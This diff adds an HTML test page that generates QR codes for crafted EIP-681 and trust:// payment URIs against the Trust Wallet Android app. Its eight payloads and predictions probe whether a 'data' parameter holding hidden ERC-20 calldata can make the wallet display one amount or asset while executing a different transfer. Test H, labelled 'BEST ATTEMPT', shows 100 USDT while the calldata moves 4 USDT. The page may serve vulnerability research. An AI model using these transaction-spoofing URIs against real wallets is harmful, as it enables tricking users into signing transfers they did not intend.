@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TW Android — Wei + Param Order Focus</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #0f0f1a; color: #e0e0f0; padding: 20px; max-width: 800px; margin: 0 auto; }
+  h1 { font-size: 20px; color: #f0f0ff; margin-bottom: 2px; }
+  .subtitle { color: #8888bb; font-size: 12px; margin-bottom: 16px; }
+  .key { background: #2a1a1a; color: #dd8888; border-left: 3px solid #aa4444; font-size: 12px; padding: 8px 12px; border-radius: 4px; margin-bottom: 16px; }
+  .key strong { color: #ffaaaa; }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  @media (max-width:600px) { .grid { grid-template-columns: 1fr; } }
+  .cell { background: #1a1a2e; border: 1px solid #2a2a3a; border-radius: 10px; padding: 12px; text-align: center; }
+  .cell .id { font-size: 24px; font-weight: bold; color: #bbbbff; margin-bottom: 2px; }
+  .cell .desc { font-size: 10px; color: #8888bb; margin-bottom: 6px; }
+  .cell img { border-radius: 8px; width: 160px; height: 160px; border: 2px solid #2a2a3a; background: white; padding: 4px; }
+  .uri { font-size: 9px; color: #aaccff; word-break: break-all; background: #0a0a15; padding: 6px; border-radius: 4px; margin: 6px 0; font-family: monospace; text-align: left; }
+  .pred { font-size: 10px; color: #88dd88; padding: 4px 6px; background: #1a2a1a; border-radius: 4px; margin-top: 6px; text-align: left; }
+  .note { font-size: 10px; color: #dddd88; padding: 4px 6px; background: #2a2a1a; border-radius: 4px; margin-top: 2px; text-align: left; }
+  textarea { width:100%; padding: 6px; border-radius: 4px; border: 1px solid #3a3a5a; background: #0a0a15; color: #e0e0f0; font-size: 11px; margin-top: 4px; font-family: inherit; height: 40px; }
+</style>
+</head>
+<body>
+
+<h1>🔬 Wei + Param Order</h1>
+<p class="subtitle">Android only. Built-in camera. Key finding: adding "data" to /transfer breaks erc20_transfer routing!</p>
+
+<div class="key">
+<strong>⚡ From Test B (v7):</strong> <code>ethereum:0xUSDT@1/transfer?address=RCP&uint256=1&data=&lt;4U&gt;</code> showed ETH not USDT. This means <code>data</code> <strong>breaks the erc20_transfer routing</strong>! But it fell through to native ETH transfer instead of passing data. These tests try variations to see which path the wallet takes.
+</div>
+
+<div class="grid" id="grid"></div>
+
+<div id="notes"></div>
+
+<script>
+const USDT = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const RCP = '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266';
+const ABI = '0xa9059cbb' +
+  '000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266' +
+  '00000000000000000000000000000000000000000000000000000000003d0900';
+
+// 0.00001 ETH in wei
+const WEI_TENTHOUSANDTH = '10000000000000';
+const WEI_HUNDREDTH = '100000000000000000';
+const WEI_TEN = '10000000000000000000';
+
+const TESTS = [
+  { id: 'A',
+    desc: 'value=0.00001 ETH in WEI',
+    uri: 'ethereum:' + USDT + '@1?value=' + WEI_TENTHOUSANDTH + '&data=' + ABI,
+    pred: 'Shows 0.00001 ETH (value in wei integer format). Confirm may be enabled. If so, data passes through and 4 USDT transfers.'
+  },
+  { id: 'B',
+    desc: 'value=0.1 ETH in WEI',
+    uri: 'ethereum:' + USDT + '@1?value=' + WEI_HUNDREDTH + '&data=' + ABI,
+    pred: 'Shows 0.1 ETH. Confirm enabled. Data should pass through. High value tests if USDT contract rejects the ETH (causing revert).'
+  },
+  { id: 'C',
+    desc: '/transfer, data FIRST (before params)',
+    uri: 'ethereum:' + USDT + '@1/transfer?data=' + ABI + '&address=' + RCP + '&uint256=1000000',
+    pred: 'Data param first → wallet may parse data before address/uint256 → may fail to build erc20_transfer → falls to contract_generic → data passes through.'
+  },
+  { id: 'D',
+    desc: '/transfer with params + data, NO amount in uint256',
+    uri: 'ethereum:' + USDT + '@1/transfer?address=' + RCP + '&uint256=0&data=' + ABI,
+    pred: 'uint256=0 → displays 0 USDT → might still be erc20_transfer (sends 0) or might fallback to generic. Data passes through either way.'
+  },
+  { id: 'E',
+    desc: 'EIP-681 /approve (different function) + data',
+    uri: 'ethereum:' + USDT + '@1/approve?address=' + RCP + '&uint256=0&data=' + ABI,
+    pred: '/approve is NOT erc20_transfer → routes to contract_generic → data passes through. Shows generic interaction with 0 ETH.'
+  },
+  { id: 'F',
+    desc: 'trust://send?asset=USDT&address=RCP ONLY data (NO amount)',
+    uri: 'trust://send?asset=' + USDT + '&address=' + RCP + '&data=' + ABI,
+    pred: 'Camera path → token picker again. But maybe with data it's different? (Previous showed empty fields)'
+  },
+  { id: 'G',
+    desc: 'ethereum:0xUSDT@1?uint256=4000000&data=' + ABI.slice(0,20) + '...',
+    uri: 'ethereum:' + USDT + '@1?uint256=4000000&data=' + ABI,
+    pred: 'No /transfer → parser treats uint256 as generic param → contract_generic. uint256=4000000 display? Might show nothing, might show amount.'
+  },
+  { id: 'H',
+    desc: '/transfer + uint256=large display + data (BEST ATTEMPT)',
+    uri: 'ethereum:' + USDT + '@1/transfer?address=' + RCP + '&uint256=100000000&data=' + ABI,
+    pred: 'uint256=100000000 = 100 USDT shown. data has 4 USDT. If erc20_transfer → 100 USDT executes (honest, controls). If data breaks it → falls to generic → 4 USDT executes. Either way we learn.'
+  }
+];
+
+function qrSrc(u) {
+  return 'https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=' + encodeURIComponent(u);
+}
+
+var html = '';
+TESTS.forEach(function(t) {
+  html += '<div class="cell">' +
+    '<div class="id">' + t.id + '</div>' +
+    '<div class="desc">' + t.desc + '</div>' +
+    '<img src="' + qrSrc(t.uri) + '" alt="QR ' + t.id + '" loading="lazy">' +
+    '<div class="uri">' + t.uri + '</div>' +
+    '<div class="pred">🎯 ' + t.pred + '</div>' +
+    '<textarea placeholder="Screen shows? NEXT? Confirm? Result?" id="r-' + t.id + '"></textarea>' +
+    '</div>';
+});
+document.getElementById('grid').innerHTML = html;
+</script>
+
+</body>
+</html>
